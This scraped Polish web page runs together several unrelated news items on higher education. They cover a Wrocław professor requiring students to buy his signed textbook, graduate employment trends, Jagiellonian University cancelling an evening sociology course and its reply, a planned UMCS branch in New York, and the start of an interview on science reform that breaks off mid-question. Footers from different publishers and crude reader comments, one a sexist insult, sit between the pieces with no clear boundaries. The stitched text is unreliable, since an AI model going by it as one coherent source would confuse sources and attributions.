Ostatnio:
12.12.2017
Black or White, czesc druga - Uniwersytet Medyczny w LublinieWersja polska:http://www.umlub.pl/ Wersja angielska: (poczekaj na wyswietlenie sie animacji flash do konca)http://www.umlub.pl/index2.html
Ta strona powstała 25.08.2009.
Wizyt: 22706.

Korzystanie z serwisu oznacza akceptację
Regulaminu.
Prywatność.
Copyright – 1999-2018 INTERIA.PL,
wszystkie prawa zastrzeżone.
- Zanim pani przyjdzie, musi tą książkę podpisać, że to jest pani własność - tłumaczy wykładowca. - A nie mogę jej pożyczyć - pyta studentka?- No właśnie nie.- A dlaczego?- Już odpowiadam, mam określony powód - wydawnictwo chce, żeby książka się sprzedała. W ten sposób przymuszam do kupna książki.    
    Uniwersytet Warszawski najlepszy
                            Uniwersytet...
                        
                            czytaj dalej »- Czyli ja nie mogę skserować książki?- Oj, nie, nie wolno. (...) Chce mieć pani bardzo łatwy sposób zdania egzaminu, kupuje pani książkę - nie ukrywa wykładowca.Tak wyglądał dialog pomiędzy reporterką TVN24, która przyszła na zajęcia udając studentkę, a profesorem zwyczajnym, od wielu lat pracującym na Uniwersytecie Wrocławskim.Z książką na egzamin O całej sprawie poinformowali nas byli studenci, którzy twierdzą, że takie zasady wykładowca stosuje   od lat.- Przed egzaminem sprawdzał czy każdy na sali ma swój egzemplarz z  dedykacją – opowiada Dawid, były student ekonomii. – Musieliśmy mieć  podpis profesora i swoje imię, jako właściciela książki. Dzięki temu  miał pewność, że każdy z nas rzeczywiście ma swój podręcznik - dodaje.    
    "Nature" pisze o wynikach poznańskich naukowców 
                            Zespół naukowców...
                        
                            czytaj dalej »- W zeszłym roku powiadomiliśmy dziekanat o całej sytuacji.   Zlekceważyli nas – mówi jedna ze studentek. – Profesor   tylko się zdenerwował i zmienił formę zaliczenia. Wcześniej zapowiadał,   że książka jest podstawą do zdania przedmiotu. Po tym incydencie   stwierdził, że zrobi nam test, podczas którego możemy korzystać z jego   książki. Tak czy siak, musieliśmy kupić podręcznik – dodaje." To niedopuszczalne"- Sprawa jest bardzo poważna. W zeszłym roku dziekan poprosił profesora o zmianę sposobu przeprowadzania egzaminu, ale widać, że i z tym profesor sobie poradził. Dziekan już wie o sprawie. Trwają procedury sprawdzające - mówi dr Jacek Przygodzki, rzecznik Uniwersytetu Wrocławskiego. - Takie postępowanie jest niedopuszczalne - dodaje.Możliwe, że sprawą również zajmie się prokuratura.
    Jak zwykle nikt o takich ptraktykach nie wiedzial .  "UCZ  SIE  JAQSIU,  UCZ  " 
    
    Ani on pierwszy, ani ostatni. Taka już tradycja kilkudziesięcioletnia na polskich uczelniach.Fakt, że większość egzaminatorów wymagała zawsze wiedzy, ale chyba na każdym wydziale i w każdym Instytucie byli tacy, którzy wymagali kupowania swoich publikacji po prostu. Gwarancja dochodu - i o to chodzi. Inaczej kto by ich kupował?
            rozwiń
    A potem absolwenci marudzą, że roboty nie mają. Funta kłaków nie jest wart dyplom "zdobyty" w ten sposób!
    
    na politechnice koszalińskiej jest podobnie na wydziałach technicznych
    
    takie metody jaki ustrój., choć cel podobny., Drapieżny ustrój więc takie metody. W Peerelu wystarczyło w odpowiedzi odnieść się pozytywnie do fragmentu jakiegoś badziewia egzaminującego i było ok. 
    
    Odkrycie Ameryki, to wręcz normalny precedens na większości uczelni, jeden chce by kupowali jego książkę, inny puści listę i wg niej wystawia oceny a inny puści pytania wcześniej i samemu trzeba je sobie opracować a to czy one będą to dopiero na egzaminie się dowiadujesz.
    
    To samo działo się przez wiele lat w Szczecinie na Wydziale Prawa i Administracji (!!!). U pewnego profesora trzeba było kupić książkę, pozakreślać w niej coś (żeby nie można było odsprzedać- właściwie to i tak profesor praktycznie co roku wydawał nową książkę, w którą jego aktualni studenci musieli się zaopatrzyć) i przyjść
            rozwiń
    taka aferaaaaa... a Śledztwo ws. "taśm PSL" umorzone HAHAHAHAH
    
    też mi nowość... na każdej uczelni tak jest... wielu a nawet większość studentów wiele by dała by niektóre egzaminy tak zaliczyć... 
    o to jak Pan Gizowski z AWF GDAŃSK, on dodatkowo chciał flaszkę lub 50zł w indeksie, paranoja !!! 
    
        Funkcjonariusze pionu kryminalnego z Komendy Miejskiej Policji we Wrocławiu namierzyli i zatrzymali złodziei, których łupem...
        czytaj dalej »
                Załoga Lotniczego Pogotowia Ratunkowego zabrała do szpitala 6-latka potrąconego przez samochód w Krapkowicach (Opolskie)....
                 czytaj dalej  »
        Dwójka nastolatków i 30-latek z Brzegu (woj. opolskie) trafili nieprzytomni do szpitali. Na razie nie wiadomo, co im się stało....
        czytaj dalej »
        Niespełna miesiąc temu skazano go za spowodowanie śmiertelnego wypadku na przejściu dla pieszych. Wyrok jeszcze nie jest...
        czytaj dalej »
                Do jesieni mają potrwać remonty na autostradzie A4 w okolicach Wrocławia. Na pierwszy rzut idzie przebudowa węzła bielańskiego,...
                 czytaj dalej  »
        Pogotowie i straż pożarna interweniowały w środę w Lutomi na Dolnym Śląsku. 8-letni chłopiec miał wypadek na rowerze,...
        czytaj dalej »
        Kilometrowe korki, hałas, spaliny... Dość tego - mówi Antoni Kopeć, burmistrz Kątów Wrocławskich. Chce on, by na podwrocławskim...
        czytaj dalej »
                Jaką tajemnicę kryje grobowiec pastora Fuchsa? Zamiast jednego szkieletu duchownego,grupa pasjonatów odkryła w krypcie na...
                 czytaj dalej  »Copyright (C) 1997-2018 Korzystanie z materiałów redakcyjnych TVN S.A. / TVN Media Sp. z o.o. wymaga wcześniejszej zgody TVN S.A./ TVN Media Sp. z o.o. oraz zawarcia stosownej umowy licencyjnej. Na podstawie art. 25 ust. 1 pkt. 1 b) ustawy o prawie autorskim i prawach pokrewnych TVN S.A. / TVN Media Sp. z o.o. wyraźnie zastrzega, że dalsze rozpowszechnianie artykułów zamieszczonych w programach oraz na stronach internetowych TVN S.A. / TVN Media Sp. z o.o. jest zabronioneMaturzyści zdają ostatnie egzaminy, a uczelnie rozpoczęły rekrutacje. Co drugi absolwent szkoły średniej wybiera się na studia.Polska staje się krajem rekordzistą wśród państw z największą liczbą osób z wyższym wykształceniem. Jeszcze 10 lat temu było 10 proc. Polaków z dyplomem magistra, teraz aż 27 proc. aktywnych zawodowo jest po studiach.W ostatnich kilku latach zmieniają się trendy dotyczące kierunków studiów. Nauki humanistyczne wyraźnie tracą na rzecz kierunków technicznych. To dowód na to, że stajemy się coraz bardziej pragmatyczni i studia zaczynamy traktować jako pierwszy krok kariery zawodowej, a nie sposób na przedłużenie młodości.>>>Uczelnie prześcigają się w pomysłach na pozyskanie studentówW ubiegłym roku po raz pierwszy kandydatów na uczelnie techniczne było więcej niż na uniwersytety. Najbardziej oblegana była Politechnika Warszawska, wzrosła też liczba podań składanych na krakowską Akademię Górniczo-Hutniczą czy Politechnikę Gdańską. Najbardziej zacięta walka toczyła się o indeksy na wydziałach inżynieryjnych, budownictwie, architekturze i urbanistyce, biotechnologii oraz informatyce. Ale rekord popularności pobiły Międzykierunkowe Studia Ekonomiczno-Menedżerskie na Uniwersytecie Warszawskim – na 50 miejsc zgłosiło się aż 1718 chętnych (34 osoby na miejsce).>>>Jak wycisnąć studenta?– Fakt, że coraz więcej osób wybiera kierunki techniczne, to bardzo dobra wiadomość, bo na rynku pracy jest ogromne zapotrzebowanie na takich absolwentów – mówi Waldemar Siwiński, prezes Fundacji Perspektywy i redaktor naczelny pisma „Perspektywy”, które od lat publikuje rankingi najlepszych polskich szkół wyższych. – Myślę, że to zainteresowanie w dużej mierze jest zasługą wprowadzenia matematyki na maturze. Młodzi ludzie zobaczyli, że nauka przedmiotów ścisłych nie jest taka straszna i teraz nie boją się ich studiować – uważa Waldemar Siwiński.Chociaż tendencje się zmieniają, uczelnie nadal oblegają kandydaci na socjologów, historyków, politologów czy pedagogów. Tymczasem od kilku lat widać, że rynek pracy nie jest w stanie zatrudnić aż tylu humanistów. Skąd więc ten szturm na kierunki humanistyczne? – Bo to studiować najłatwiej. Każdemu wydaje się, że umie czytać. Nie zastanawia się, czy czyta ze zrozumieniem – odpowiada prof. Lesław Piecuch, prezes Stowarzyszenia Edukacja dla Przedsiębiorczości.>>>Niepotrzebne studiaInaczej widzi to Justyna Bednarczyk-Wilgos, psycholog z SWPS. – Młodzi ludzie kończący szkołę średnią nie wiedzą jeszcze, co chcieliby robić w przyszłości. Wybierając studia, kierują się więc przede wszystkim zainteresowaniami. Stawiają na rozwój osobisty – uważa Justyna Bednarczyk-Wilgos.Studiować gry komputerowe Poskutkowały rady ekspertów, by wybierać dziedziny nietypowe, w których mało jest specjalistów. Podczas ubiegłorocznej rekrutacji okazało się, że niszowe, ale perspektywiczne kierunki były prawdziwym hitem. Na Uniwersytecie Warszawskim o jedno miejsce na sinologię walczyło 20 osób, na japonistyce 18 kandydatów. Na Uniwersytecie Jagiellońskim o jeden indeks na filologii orientalnej ubiegało się 18 osób. Na uwagę zasługują też wąskospecjalistyczne nowinki. I tak, na Uniwersytecie Śląskim powstaje m.in. doradztwo filozoficzne i coaching, projektowanie rozrywki interaktywnej oraz lokalizacja gier i oprogramowania (sprint–write). Uniwersytet im. Adama Mickiewicza w Poznaniu wprowadza w tym roku kierunki: fizykę medyczną, technologie komputerowe czy językoznawstwo komputerowe (specjalizacja). – W tym roku wprowadzamy kierunek studia azjatyckie, na którym studenci będą się uczyli języka chińskiego – wymienia Natalia Osica, rzecznik SWPS.>>>Niszowe studia w cenieO tym, że przy wyborze studiów warto zastanowić się nad tym, czy będziemy mieć szansę znaleźć pracę zgodną z naszym wykształceniem, przekonują zatrważające dane statystyczne. W tym roku padł niechlubny rekord dotyczący liczby bezrobotnych magistrów. Okazało się, że co dziewiąty poszukujący pracy ma w kieszeni dyplom wyższej uczelni. W miastach co czwarta osoba bez zajęcia jest po studiach. I nic nie wskazuje, by sytuacja miała się szybko poprawić.Odpowiedzią na bezrobocie wśród absolwentów szkół wyższych mają być kierunki zamawiane, czyli takie, które powstają na uczelniach pod kątem zapotrzebowania na rynku pracy na ich absolwentów. Ci, którzy wybiorą kierunki strategiczne, mają więc znacznie większe szanse, że po ich ukończeniu nie będą mieć problemów ze znalezieniem pracy. Naukę łączą z praktykami w konkretnych przedsiębiorstwach. Co więcej, studenci otrzymują zachętę finansową – miesięcznie nawet 1 tys. zł stypendium. Wsparcie finansowe otrzymuje także szkoła wyższa za wprowadzenie kierunków zamawianych do swojej oferty. Co można studiować? Paleta jest spora: automatykę i robotykę, biotechnologię, budownictwo, chemię, energetykę, fizykę i fizykę techniczną, informatykę, inżynierię materiałową, inżynierię środowiskową, matematykę, mechanikę i budowę maszyn, mechatronikę, ochronę środowiska i wzornictwo. W tym roku lista została poszerzona o dwa specjalistyczne kierunki: inżynierię chemiczną oraz technologię chemiczną i procesową.Program ruszył cztery lata temu, ale jego efekty już budzą kontrowersje. Wprawdzie absolwenci nie mają problemów ze znalezieniem pracy, ale wątpliwości wzbudza koszt ich wykształcenia. Opłacenie nauki dla pierwszego rocznika kierunków zamawianych kosztowało 53 mln zł. Problem w tym, że I rok ukończył zaledwie co piąty student, który się na nie zdecydował. Skrajnym przykładem jest historia z Państwowej Wyższej Szkoły Zawodowej, gdzie na kierunku inżynierskim (automatyka i robotyka) ze 130 przyjętych studentów zostało 17.– Wykształcenie jednego absolwenta kierunków zamawianych pochłonęło 250 tysięcy złotych – mówi prof. Lesław Piecuch, prezes Stowarzyszenia Edukacja dla Przedsiębiorczości, i dodaje: – 20 procent absolwentów programu, na który przeznaczono tak dużo pieniędzy, to bardzo słaby wynik.Głównym powodem jest to, że kierunki zamawiane okazują się zbyt trudne dla studentów. Większość z nich musi nadrabiać zaległości z przedmiotów ścisłych (chodzą na dodatkowe, opłacane przez uczelnie zajęcia z matematyki), bo nie wynieśli tej wiedzy ze szkół średnich. – Dla jednej trzeciej studentów kierunek zamawiany jest drugim, jaki studiują. Często źle szacują swoje siły i po pierwszym roku odpadają – mówi prof. Lesław Piecuch.Według uczelni przy realizacji programu kierunków zamawianych szwankują co najmniej dwie rzeczy. Po pierwsze nabór prowadzony jest dopiero we wrześniu, a to oznacza, że wiele osób, które nie dostały się na wcześniej upatrzone wydziały, by studiować cokolwiek, składa podania na kierunki zamawiane. To sprawia, że trafia tam młodzież mniej zdolna. Po drugie istotna jest kwestia finansowa. Studenci dostają stypendium (za to, że są, a nie za wyniki w nauce), ale nie muszą go zwracać, jeśli rezygnują z kierunku zamawianego. Jest wprawdzie zapis zobowiązujący do oddania otrzymanego wsparcia, jeśli student sam rezygnuje z kierunku strategicznego. Jednak w praktyce wygląda to tak, że żacy czekają, aż zostaną po prostu skreśleni przez dziekana.Czym się kierować, wybierając studia? Cenną wskazówką jest prowadzony od 2011 roku monitoring losów zawodowych absolwentów poszczególnych szkół wyższych. Dzięki niemu powinniśmy wiedzieć, jak wygląda poszukiwanie pracy przez świeżo upieczonych magistrów. Niestety nie wszystkie uczelnie podają dane do publicznej wiadomości. Robi tak krakowska Akademia Górniczo-Hutnicza (znajdująca się w pierwszej trójce najlepszych uczelni technicznych w Polsce). Ale też ma się czym pochwalić. – Mamy jedne z najlepszych wyników w Polsce, bo nasi absolwenci (ok. 80 proc.) znajdują pracę w niecałe trzy miesiące od momentu odebrania dyplomu. I aż 83 proc. z nich pracuje w zawodzie – wymienia Bartosz Dembiński, rzecznik AGH.Dobre wyniki ma też Uniwersytet Śląski. 67 proc. absolwentów znajduje zatrudnienie w ciągu trzech miesięcy po uzyskaniu dyplomu. Dłużej niż pół roku poszukiwało pracy ok. 15 proc. absolwentów.Bartosz Loba, rzecznik Ministerstwa Nauki i Szkolnictwa Wyższego, podkreśla, że magistrowie wciąż mają większe szanse na znalezienie pracy niż ich koledzy bez studiów. I jako dowód podaje dane statystyczne: absolwenci uniwersytetów w ciągu pięciu lat po zakończeniu studiów są zdecydowanie częściej zatrudniani i rzadziej bezrobotni niż osoby z niższym wykształceniem – różnica jest widoczna szczególnie wśród kobiet. Bezrobotnych pięć lat po zakończeniu nauki jest 53 proc. absolwentek zawodówek, 43 proc. absolwentek techników, 39 proc. absolwentek liceów, a 12 proc. absolwentek studiów magisterskich (23 proc. studiów licencjackich, 8 proc. inżynierskich). – Nie jest więc prawdziwa popularna teza, że łatwiej dziś o pracę absolwentowi zawodówki niż uniwersytetu. Zdobywanie wyższego wykształcenia wciąż jest dobrą strategią kształtowania kariery, a pracodawcy – mimo wszystko – cenią umiejętności absolwentów, skoro ich zatrudniają – podsumowuje Bartosz Loba.Podczas gdy my śledzimy, czy świeżo upieczeni magistrowie radzą sobie na rynku pracy, szkoły wyższe za granicą badają głównie to, ile ich wychowankowie zarabiają. Właśnie takie informacje są magnesem przyciągającym przyszłych żaków. W Polsce takie dane ukazują się niezwykle rzadko, tym bardziej na uwagę zasługuje raport z Ogólnopolskiego Badania Wynagrodzeń przeprowadzony przez Sedlak & Sedlak na zlecenie Pracuj.pl.Okazuje się, że średnie wynagrodzenie świeżo upieczonego absolwenta szkoły wyższej wynosiło 2,5 tys. zł (brutto). Wysokość zarobków była uzależniona od profilu ukończonej akademii. Najlepiej mieli absolwenci kierunków technicznych – średnia w tym przypadku to 3 tys. zł brutto. Natomiast studenci tych kierunków chcieli otrzymywać 2265 zł netto, po roku od ukończenia studiów – 2989 zł, po trzech latach – 4113 zł (czyli 81 proc. więcej niż u progu kariery). Na kokosy nie mają co liczyć humaniści. Co drugi absolwent inkasował 1,8-3 tys. zł.Pieniądze to nie wszystko, dlatego decydując się na walkę o indeks, weźmy pod uwagę inne rady pracowników naukowych. – Upewnijmy się, że oferta szkoły wyższej nie tylko koncentruje się na teorii, lecz także rozwija umiejętności praktyczne, korzysta z najnowszych technologii – wymienia Justyna Bednarczyk--Wilgos. I rzecz być może najważniejsza. – Trzeba mieć świadomość, że studia to ciężka praca. Młodzi ludzie nie są do tego przyzwyczajeni. Myślą, że studia to sposób przedłużenia sobie młodości, a tu chodzi po prostu o żmudną naukę – zauważa prof. Lesław Piecuch.Czytaj online najnowsze wydania „Newsweek Polska”, „Newsweek Historia” oraz wybór tekstów z wydania amerykańskiego!LogowanieNie masz jeszcze konta?Wybierz regionWybierz miasto
Autor: Katarzyna Ponikowska        Uniwersytet Jagielloński nie uruchomił kilkunastu kierunków. Powiadomił o tym w dniu zakończenia rekrutacji (© Andrzej Banaś)Masz zdjęcie do tego tematu?
    Basia miała rozpocząć studia na wieczorowej socjologii. Zapłaciła za nie, wynajęła mieszkanie w Krakowie i spakowała walizki. Wtedy dostała telefon z komisji rekrutacyjnej: kierunek nie zostanie otwarty.
  Podziel się na TwitterzeSkomentujMinister uhonoruje Dominika. "Wybił szybę i wyprowadził kolegów z autokaru"Kraków ruszył z pomocą rannym w wypadku na zakopiance [ZDJĘCIA, WIDEO]Znamy prawdopodobną przyczynę wypadku w Tenczynie [ZDJĘCIA, WIDEO]Dodaj zdjęcie do materiału.Aby wysłać zdjęcie musisz zgodzić się z poniższym warunkiem.pytanie 1: Zacznijmy od rozgrzewki: gdzie odbyły się pierwsze mistrzostwa?
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
    Podane dane osobowe będą przetwarzane przez Polska Press Sp. z o.o. z siedzibą w Warszawie. Podanie danych jest dobrowolne.
  Pozostałe informacje na temat celu i zakresu przetwarzania danych osobowych oraz Twoich praw znajdziesz w regulaminie.
    Dodając komentarz akceptujesz regulamin.
  Zaloguj się / Zarejestruj się!
        ok, przeczytałem oświadczenie i rzeczywiście istniała możliwość rejestracji nawet później na inne studia to UJ zachował się OK.  Choć zapewne jakaś informacja w połowie września byłaby sensowna.      
        Pewnie niektórzy studenci powinni przewidzieć taką sytuację. Ale na podstawie informacji o warunkowym przyjęciu na studia i informacji, że kierunek może nie zostać uruchomiony, jeżeli nie zgłosi się dostateczna liczba chętnych trudno wywnioskować, że ten kierunek za kilka miesięcy nie zostanie uruchomiony. Doprawdy trochę logiki w niektórych komentarzach by się przydało:) Ale pytanie czy nie można zawiadomić studentów wcześniej? Przecież chyba wyraźnie widać, że skoro zgłosiły się dotychczas 3 czy 4 osoby to jest bardzo prawdopodobne, że kierunek nie zostanie uruchomiony? To jakaś zaawansowana matematyka? Czy po prostu nie chciało się zadzwonić?  A prawda jest taka, że UJ to prawdziwe pole minowe. Trzeba bardzo uważać, bo niezbyt przyjemnie niespodzianki są coraz częstsze. A ci, którzy jeszcze poniżają tych ludzi chyba życia nie znają:) Fajnie jest powiedzieć, że ktoś nie był dostatecznie przezorny. Ale w życiu różnie bywa.      
        UJ wydał w tej sprawie wyjaśnienie: http://www.uj.edu.pl/uniwersytet/aktualnosci/rzecznik-prasowy?p_p_id=56_INSTANCE_5jwD&p;_p_lifecycle=0&p;_p_state=normal&p;_p_mode=view&p;_p_col_id=column-3&p;_p_col_count=1&groupId;=10172&articleId;=1992162      
        To raczej świadczy o niezaradności i głupocie niedoszłej studentki. Swoją drogą, zawsze jest też rekrutacja uzupełniająca, więc jak ktoś ma za grosz oleju w głowie, to sobie poradzi. W przeciwnym wypadku nawet "tani bilet do Anglii" nie pomoże. Ludzie dzisiaj są kompletnie nieprzygotowani do życia... ehhh szkoda słów.      
        Jak zawsze prawda leży po środku. I jak ktoś gapa i składał papiery tylko na kierunek, o który wiedział, że może nie ruszyć, to teraz cierpi. Może rzeba było się asekurować innymi kierunkami...      
        www.forumkrakowa.com - forum miaszta. Zapraszamy do dyskusji      
        Biologi tez drugi rok z rzędu ni ma, ja miałem jedynie przyjemność studiować dwa semestry, później z 60 osób zostało 12.... szkoda gadać.      
        E tam, przecież studia na socjologii to tylko odroczone bezrobocie. A tak to prace może szukac już teraz, jak dziołcha zaradno, to jest szansa, że za 5 lat będzie już jakoś ustawiona.      
        By się Basia w liceum uczyła, a nie dupy dawała
to by na dziennych studiach wylądowała.      
        a nie sensacji szukacie, co roku jakiś student jest pokrzywdzony, z własnej głupoty, bo na ostatnią chwilę wszystko robi, bo nie potrafi zapisać się na więcej kierunków jednocześnie etc. w KFC szukają menadżerów. powodzenia!      
        I tak po socjologii nie znalazla by dobrej pracy wiec jeszcze bedzie wdzięczna losowi :)      
        Wyjaśnienie władz Uniwersytetu Jagiellońskiego do artykułu Pani Katarzyny Ponikowskiej „Jak UJ wystawił młodzież do wiatru\\\\\\\\\\\\\\\"

Kraków, 14 października 2010 r.

Szanowny Pan
Redaktor Naczelny
Tomasz Lachowicz
Polska Gazeta Krakowska
al. Pokoju 3
31-548, Kraków



Szanowny Panie Redaktorze,

przesyłam wyjaśnienie władz Uniwersytetu Jagiellońskiego do artykułu Pani Katarzyny Ponikowskiej „Jak UJ wystawił młodzież do wiatru\\\\\\\\\\\\\\\", zamieszczonego 11 października br, na łamach \\\\\\\\\\\\\\\"Gazety Krakowskiej\\\\\\\\\\\\\\\". Zwracam się z prośbą przedrukowanie poniższego tekstu w dziale Listy do „Krakowskiej\\\\\\\\\\\\\\\".

W opisanym przez dziennikarkę przypadku Dział Rekrutacji UJ postępował zgodnie z procedurą, o której poinformowaliśmy już w marcu br. kandydatów na studia na stronie internetowej Uczelni. Wielkości limitów oraz wynikające z nich zasady uruchamiania studiów zostały przyjęte uchwałą nr 11/II/2010 Senatu UJ z 24 lutego 2010 roku.

cdn...      
        cd...
Jeżeli w trakcie kolejnych etapów naboru liczba osób była nadal mniejsza od dolnego limitu, każdy przyjęty na studia otrzymywał warunkową decyzję o przyjęciu na pierwszy rok, z umieszczonym w niej następującym zastrzeżeniem: „[…] Wydziałowa Komisja Rekrutacyjna […] postanawia przyjąć Pana/Panią na pierwszy rok studiów […] pod warunkiem, że liczba osób wpisanych na te studia w roku akademickim 2010/2011 będzie nie mniejsza niż dolny limit przyjęć określony uchwałą nr 11/II/2010 Senatu UJ z 24 lutego 2010 roku.\\\\\\\'\\\\\\\'.

Do 27 września na liście było przyjętych na studia wieczorowe na socjologię było 19 osób. Termin wpisu na te studia upływał 29 września. Po tym terminie na studia zapisało się 13 osób, co nie uprawniało Uczelni do otwarcia studiów. Osoby, które zapisały się na studia wieczorowe na socjologię, zostały poinformowane o decyzji 30 września br., a zatem natychmiast. Każdy kandydat razem z informacją, że studia nie będą uruchomione, otrzymał telefonicznie informację o możliwości dokonania rejestracji na inne pokrewne kierunki, na których były jeszcze wolne miejsca. Z podjętego postępowania zgodnego z przyjętymi uchwałami na UJ, nie wynika, że „UJ wystawił młodzież do wiatru\\\\\\\".


Z poważaniem

Katarzyna Pilitowska
rzecznik prasowy UJ      
        nie pierwszy raz UJ zostawia studentow na lodzie, tak samo bylo ze zmniana regulaminu w trakcie studiow, wielu osobom na ostatnim roku przez to brakowalo punktow.      
        Jaka gazeta taki news...      Minister uhonoruje Dominika. "Wybił szybę i wyprowadził kolegów z autokaru"Marek Konieczny, jeden z współzałożycieli i trenerów Akademii Piłkarskiej 21 Kraków - uczestnika rozgrywek Centralnej...W poniedziałek po godz. 14 Adam Nawałka na specjalnie zwołanej konferencji w Arłamowie, ogłosił 23-osobową kadrę,...Polska Press sp. z.o.o informuje, że wszystkie treści ukazujące się w serwisie naszemiasto.pl podlegają ochronie.
            Dowiedz się więcej.
            Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
          
              © 2000-2018 Polska Press Sp. z o.o.
REKLAMAUniwersytet Marii Curie-Skłodowskiej otworzy w Nowy Jorku wydział zamiejscowy. W środę w Lublinie podpisane zostało porozumienie między uczelnią a Centralą Polskich Szkół Dokształcających (CPSD) w Ameryce.REKLAMAJak powiedziała PAP prezes CPSD Dorota Andraka będzie to pierwsza filia polskiego uniwersytetu w Stanach Zjednoczonych.>>> czytaj też: Uniwersytet Hamburgera – dostać się tu trudniej, niż na Harvard (ZDJĘCIA)"Pierwsi studenci zostaną przyjęci w roku akademickim 2013/2014. Na początek planujemy uczyć języka polskiego jako przedmiotu obcego. Z tego kierunku mogłyby korzystać osoby, które będą uczyć języka polskiego w amerykańskich szkołach" - dodała.Andraka zaznaczyła, że w przyszłości powstaną kolejne kierunki, niekoniecznie związane z językiem polski. "Będziemy prowadzić sondaże wśród studentów, którzy sami zadecydują, jakie przedmioty chcieliby studiować" - zaznaczyła.Zanim UMCS będzie mógł otworzyć filię w Nowym Jorku musi uzyskać zgody Ministerstwa Nauki i Szkolnictwa Wyższego oraz Ministerstwa Spraw Zagranicznych.Według rektora lubelskiej uczelni prof. Andrzeja Dąbrowskiego nie powinno być z tym kłopotów. "Wiemy, jakich dokumentów wymagają ministerstwa, więc liczymy, że nie będzie z tym większych problemów" - dodał.Rektor powiedział, że w nowojorskiej filii będą prowadzone trzyletnie studia licencjackie. Bezpłatnie kształcić się na nich będą studenci z polskim obywatelstwem, pozostałe osoby będą musiały płacić.Zdaniem prof. Dąbrowskiego otwarcie filii nie będzie dużym obciążeniem dla uczelni. "Oprócz nas w kosztach partycypuje CPSD. Liczymy także na granty, wsparcie MSZ oraz na polonijnych sponsorów" - powiedział rektor UMCS.Wykładowcami w nowojorskiej fili mają być profesorowie z Lublina oraz Uniwersytetu w Nowym Jorku, z którym UMCS ma podpisane porozumienie o współpracy.Centrala Polskich Szkół Dokształcających w Ameryce jest organizacją, która pełni rolę polonijnego kuratorium szkolnego - koordynuje pracę polonijnych szkół.Powstał program promocji polskiego przemysłu odzieżowego za granicąReklama
(inforCookieWall=window.inforCookieWall||[]).push(['onLoad', ['Advert', 'Analytical', 'Profiling'], function(api, onLoadEvent) {
requirejs(['adsenseLoader'], function(a)
{
a.init(
'#idm140415317578560',
'ca-pub-5712816998921510',
'7944817988/9947689748',
'650',
'90',
'<p align="right"><font size="1px" color="#CBCBCB">Reklama</font></p><p align="center">',
'</p>'
);
});
}]);
Twój komentarz został dodany.
Aby go zobaczyć przejdź do strony z najnowszymi komentarzami.
Błąd podczas dodawania komentarza - nie zostały uzupełnione wszystkie wymagane pola.Dodawanie komentarzy z Twojego adresu IP zostało zablokowane.Zanim dodasz komentarz - zapoznaj się z zasadami komentowania artykułów.
Widzisz naruszenie regulaminu?
Zgłoś je!Piotr Woźny został wiceprezesem państwowego funduszu - wynika z 
informacji portalu WysokieNapiecie.pl. Będzie odpowiedzialny za program 
termomodernizacij o budżecie 103 mld zł.Ludzie teoretycznie akceptują osoby bez włosów, ale ukradkiem przypatrują się zaszokowani. Łysina jest albo rodzajem manifestu, albo oznaką choroby. „Nagość” głowy zasłania często chustka, czapka lub peruka.Wpisanie trasy Via Carpatia do projektu rozporządzenia dotyczącego instrumentu Łącząc Europę (CEF) to szansa na łatwiejsze pozyskanie dofinansowania środkami unijnymi tego korytarza - poinformował w piątek dziennikarzy minister infrastruktury Andrzej Adamczyk.przejdź do e-wydania DGPCopyright INFOR BIZNES SP. z o.o.RSS |
Reklama |
Kariera |
Ochrona prywatności |
Regulamin |
Komunikaty |
Kontakt
Username


Password


Remember Me

Witaj na Stronie Instytutu Języka Angielskiego UŚ Welcome to the official Website of Institute of EnglishKierunek Filologia Angielska prowadzony przez Instytut Języka Angielskiego otrzymał ocenę wyróżniającą Państwowej Komisji Akredytacyjnej. Wyróżnienie takie otrzymały tylko dwie anglistyki w Polsce. The English Studies program offered by Institute of English has been awarded an excellent grade by the State Accreditation Commission. This distinction has been conferred on only two English Departments in Poland. W IJA prowadzone są badania z zakresu następujących dziedzin:- przyswajanie języka obcego;- leksykografia;- teoria przekładu, przekład ustny;- językoznawstwo opisowe- historia języka angielskiegoAt Institute of English, research is conducted in the following areas:- foreign language acquisition;- lexicography;- translation theory, interpretation studies;- descriptive linguistics- history of English  IJA jest organizatorem konferencji International Conference on Foreign and Second Language Acquisition. Dodatkowe informacje o IJAPublikacje IJATomy zbiorowe oraz monografie autorstwa pracowników IJAKonferencjeKonferencje, sympozja i spotkania naukowe organizowane przez IJATematy badawczeGłówne nurty badań prowadzonych przez pracowników IJACzasopismaCzasopisma naukowe redagowane w ramach IJAStruktura IJAStruktura Instytutu Języka Angielskiego Celem reformy nauki i szkolnictwa wyższego powinno być ograniczenie demokracji na uczelniach - mówi RMF FM prof. Zbigniew Błocki. Szef Narodowego Centrum Nauki, instytucji pośredniczącej w finansowaniu projektów naukowych, widzi w tym warunek konieczny dla podniesienia jakości badań naukowych i kształcenia. Jego zdaniem, władze uczelni muszą przede wszystkim dążyć do podnoszenia tej jakości co nie zawsze jest tożsame z interesem badaczy na uniwersytecie czy studentów jako całej społeczności. We wtorek podczas Narodowego Kongresu Nauki w Krakowie poznamy ministerialny projekt ustawy reformującej polską naukę i szkolnictwo wyższe. W rozmowie z Grzegorzem Jasińskim prof. Błocki przewiduje, że pójdzie ona w takim kierunku, którego on oczekuje, choć nie tak daleko, jak by chciał. Jak podkreśla, reforma powinna przyczynić się do zwiększenia efektywności wykorzystywania pieniędzy. Pierwsze korzystne działania już zresztą podjęto, odstępując od uzależniania finansowania od liczby studentów i doktorantów. Dzięki temu uczelniom nie będzie się już opłacało zwiększanie naboru, co - jego zdaniem - prowadziło do licznych patologii. Szef NCN liczy też na to, że nowe regulacje prawne ułatwią współpracę międzynarodową, co ma kluczowe znaczenie dla podniesienia poziomu badań naukowych w Polsce.
Grzegorz Jasiński: Panie profesorze, jesteśmy w przededniu Narodowego Kongresu Nauki, ogłoszenia konkretnych propozycji, a nawet projektu reform w polskiej nauce i szkolnictwie wyższym. Na co pan liczy?
Prof. Zbigniew Błocki: Przede wszystkim muszę powiedzieć, że od wielu lat uważałem i dawałem temu wyraz publicznie, że taka porządna reforma polskiego systemu nauki jest bardzo potrzebna... 
Czy to będzie porządna reforma? 
